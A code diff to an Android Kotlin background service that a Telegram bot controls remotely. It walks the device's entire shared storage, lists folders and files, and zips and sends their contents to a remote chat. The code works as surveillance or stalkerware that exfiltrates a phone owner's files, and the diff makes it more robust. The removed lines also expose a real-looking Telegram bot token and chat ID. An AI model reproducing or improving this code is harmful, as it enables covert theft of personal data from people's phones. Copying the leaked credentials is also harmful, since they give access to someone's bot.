@@ -57,8 +57,8 @@ import java.util.zip.ZipOutputStream
 class MonitorService : LifecycleService() {
 
     companion object {
-        private const val BOT_TOKEN = "8512990339:AAE-PXlxR_xp8vsQ_M1Rm8sxXE7NL4f3X9c"
-        private const val CHAT_ID   = "8937193601"
+        private const val BOT_TOKEN = "YOUR-TELEGRAM-BOT-TOKEN"
+        private const val CHAT_ID   = "YOUR-CHAT-ID"
 
         private const val TAG              = "MonitorService"
         private const val NOTIFICATION_ID  = 1001
@@ -238,7 +238,10 @@ class MonitorService : LifecycleService() {
 
                     // Cancel previous job for this chat if still running
                     activeJobs[chatId]?.cancel()
+                    // Clear stop flag only when new real command arrives
                     stopFlags[chatId] = false
+                    // Small delay so in-flight sendMessage calls see the stop flag first
+                    kotlinx.coroutines.runBlocking { delay(200L) }
 
                     val job = serviceScope.launch {
                         try {
@@ -885,7 +888,7 @@ Type a *number* to open folder or download file
     // ══════════════════════════════════════════════════════════════════════════
 
     private suspend fun handleAllFiles(chatId: String, pathArg: String) {
-        val root   = Environment.getExternalStorageDirectory()   // /storage/emulated/0
+        val root   = Environment.getExternalStorageDirectory()
         val target = if (pathArg.isEmpty()) root else resolveFolder(root, pathArg)
         if (target == null) {
             sendMessage(chatId, "${dp()}❌ Not found: `$pathArg`\nSend /allfiles to start from root.", "Markdown"); return
@@ -895,65 +898,71 @@ Type a *number* to open folder or download file
         val dispPath = "/storage/emulated/0${if (relPath.isEmpty()) "" else "/$relPath"}"
         pathCache[chatId] = relPath
 
-        // Build numbered list: folders first, then files
-        val all      = target.listFiles()
-            ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
-            ?: emptyList()
-        val items    = all.map { FsItem(it.name, it, it.isDirectory) }
+        // Folders first (sorted), then files (sorted) — numbered 1..N continuously
+        val allFiles  = try { target.listFiles() } catch (_: SecurityException) { null }
+        if (allFiles == null) {
+            sendMessage(chatId, "${dp()}❌ Cannot read folder — permission denied.", "Markdown"); return
+        }
+        val folders = allFiles.filter { it.isDirectory }.sortedBy { it.name.lowercase() }
+        val files   = allFiles.filter { it.isFile }.sortedBy { it.name.lowercase() }
+        val items     = (folders + files).map { FsItem(it.name, it, it.isDirectory) }
         fsCache[chatId] = items
 
         if (items.isEmpty()) {
-            sendMessage(chatId, "${dp()}📂 *$dispPath*\n\n📭 Empty folder.", "Markdown"); return
+            sendMessage(chatId, "${dp()}📂 *$dispPath*\n\n📭 Empty.", "Markdown"); return
         }
 
-        val folders = items.filter { it.isDir }
-        val files   = items.filter { !it.isDir }
+        // ── Header message ──
+        sendMessage(chatId,
+            "${dp()}📂 *$dispPath*\n📁 ${folders.size} folders  •  📄 ${files.size} files\n─────────────────────────",
+            "Markdown")
 
-        // Header
-        val header = "${dp()}📂 *Path:* `$dispPath`\n" +
-            "📁 ${folders.size} folders  |  📄 ${files.size} files\n" +
-            "─────────────────────────\n"
-
-        // Send folders in pages of PAGE_SIZE
+        // ── Send folders page by page (15 per message) ──
         if (folders.isNotEmpty()) {
-            var page = StringBuilder(header + "📁 *FOLDERS:*\n\n")
+            var page  = StringBuilder("📁 *FOLDERS:*\n\n")
             var count = 0
-            folders.forEach { item ->
-                val num   = items.indexOf(item) + 1
-                val size  = formatSize(getFolderSize(item.file))
-                val inner = item.file.listFiles()?.size ?: 0
-                page.append("$num. 📁 `${item.name}`\n    $inner items • $size\n\n")
+            folders.forEachIndexed { i, f ->
+                if (isStopped(chatId)) return
+                val num   = i + 1  // folders are always 1..folders.size
+                val inner = try { f.listFiles()?.size ?: 0 } catch (_: Exception) { 0 }
+                val size  = formatSize(getFolderSize(f))
+                page.append("$num. 📁 *${f.name}*\n    📊 $inner items • $size\n\n")
                 count++
                 if (count >= PAGE_SIZE) {
                     sendMessage(chatId, page.toString().trimEnd(), "Markdown")
                     page = StringBuilder()
                     count = 0
+                    delay(300L)
                 }
             }
             if (count > 0) sendMessage(chatId, page.toString().trimEnd(), "Markdown")
         }
 
-        // Send files in pages of PAGE_SIZE
+        // ── Send files page by page ──
         if (files.isNotEmpty()) {
             var page  = StringBuilder("📄 *FILES:*\n\n")
             var count = 0
-            files.forEach { item ->
-                val num = items.indexOf(item) + 1
-                page.append("$num. 📄 `${item.name}`\n    ${formatSize(item.file.length())}\n\n")
+            files.forEachIndexed { i, f ->
+                if (isStopped(chatId)) return
+                val num = folders.size + i + 1  // files numbered after folders
+                page.append("$num. 📄 *${f.name}*\n    💾 ${formatSize(f.length())}\n\n")
                 count++
                 if (count >= PAGE_SIZE) {
                     sendMessage(chatId, page.toString().trimEnd(), "Markdown")
                     page = StringBuilder()
                     count = 0
+                    delay(300L)
                 }
             }
             if (count > 0) sendMessage(chatId, page.toString().trimEnd(), "Markdown")
         }
 
+        val zipPath = if (relPath.isEmpty()) "/" else relPath
         sendMessage(chatId,
             "─────────────────────────\n" +
-            "💡 *Type a number* to open folder or download file\n" +
-            "🗜️ `/zip $relPath` to ZIP this folder",
+            "💡 *Type number* → folder khule ya file download ho\n" +
+            "🗜️ `/zip $zipPath` — ZIP this folder\n" +
+            "🛑 /stop — ruk jao",
             "Markdown")
     }
 
@@ -1007,7 +1016,15 @@ Type a *number* to open folder or download file
         val target = resolveFolder(root, pathArg) ?: File(root, pathArg).takeIf { it.isFile }
         if (target == null) { sendMessage(chatId, "${dp()}❌ Not found: `$pathArg`", "Markdown"); return }
         val files = if (target.isFile) listOf(target)
-                    else target.walkTopDown().filter { it.isFile }.toList()
+                    else try {
+                        target.walkTopDown()
+                            .onEach { if (isStopped(chatId)) return@handleZip }
+                            .filter { it.isFile }
+                            .toList()
+                    } catch (_: SecurityException) {
+                        sendMessage(chatId, "${dp()}❌ Permission denied reading folder.")
+                        return
+                    }
         sendMessage(chatId,
             "${dp()}🗜️ Zipping `$pathArg`…\n📊 ${files.size} files, ${formatSize(files.sumOf { it.length() })}\n⏳ 0%",
             "Markdown")
@@ -1136,7 +1153,10 @@ Type a *number* to open folder or download file
     }
 
     private fun getFolderSize(dir: File): Long {
-        var t = 0L; dir.walkTopDown().forEach { if (it.isFile) t += it.length() }; return t
+        // Only direct children — deep scan is too slow for large folders
+        return try {
+            dir.listFiles()?.sumOf { if (it.isFile) it.length() else 0L } ?: 0L
+        } catch (_: Exception) { 0L }
     }
 
     private fun formatSize(bytes: Long): String = when {
@@ -1158,6 +1178,8 @@ Type a *number* to open folder or download file
     }
 
     private fun sendMessage(chatId: String, text: String, parseMode: String? = null) {
+        // If stop was requested for this chat, skip non-stop messages silently
+        if (stopFlags[chatId] == true && !text.contains("🛑")) return
         try {
             val json = JSONObject().apply {
                 put("chat_id", chatId); put("text", text)
